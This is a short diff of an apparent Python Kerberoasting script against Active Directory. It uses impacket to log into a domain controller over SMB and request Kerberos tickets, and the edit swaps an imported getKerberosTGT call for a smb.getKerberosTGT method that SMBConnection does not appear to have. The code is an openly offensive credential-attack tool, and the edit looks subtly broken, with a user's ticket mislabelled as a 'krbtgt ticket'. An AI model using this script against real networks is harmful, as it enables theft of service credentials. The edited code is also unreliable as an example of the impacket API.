@@ -1,5 +1,5 @@
 from impacket.smbconnection import SMBConnection
-from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
+from impacket.krb5.kerberosv5 import getKerberosTGS
 from impacket.krb5.types import Principal
 from ldap3 import Server, Connection, ALL_ATTRIBUTES
 
@@ -10,7 +10,7 @@ def kerberoast(username, password, domain, dc_ip):
         smb.login(username, password, domain)
 
         # Get TGT ticket for the specified user
-        krbtgt_ticket = getKerberosTGT(username, domain, dc_ip, None, None)
+        krbtgt_ticket = smb.getKerberosTGT(username, password, domain)
         if krbtgt_ticket:
             print("Successfully obtained krbtgt ticket.")
             
